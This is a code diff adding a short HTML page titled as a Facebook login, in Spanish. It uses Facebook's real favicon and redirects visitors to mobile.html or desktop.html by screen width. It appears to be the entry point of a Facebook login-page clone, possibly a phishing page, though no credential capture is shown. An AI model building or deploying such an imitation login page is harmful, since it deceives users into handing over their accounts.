@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>Iniciar Sesion en Facebook</title>
+        <!-- Aquí irían los enlaces a los estilos CSS de Facebook -->
+        <link rel="preload" href="normalize.css" as="style" />
+        <link rel="stylesheet" href="normalize.css" />
+        <link rel="preload" href="styles.css" as="style" />
+        <link rel="stylesheet" href="styles.css" />
+        <link
+            rel="icon"
+            href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico"
+        />
+    </head>
+    <body>
+        <script>
+            // Detectar el ancho de la ventana
+            const windowWidth = window.innerWidth;
+
+            // Definir las rutas de los archivos HTML para cada caso
+            let filePath;
+            if (windowWidth <= 768) {
+                filePath = 'mobile.html';
+            } else {
+                filePath = 'desktop.html';
+            }
+
+            // Redireccionar a la página HTML adecuada
+            window.location.href = filePath;
+        </script>
+    </body>
+</html>
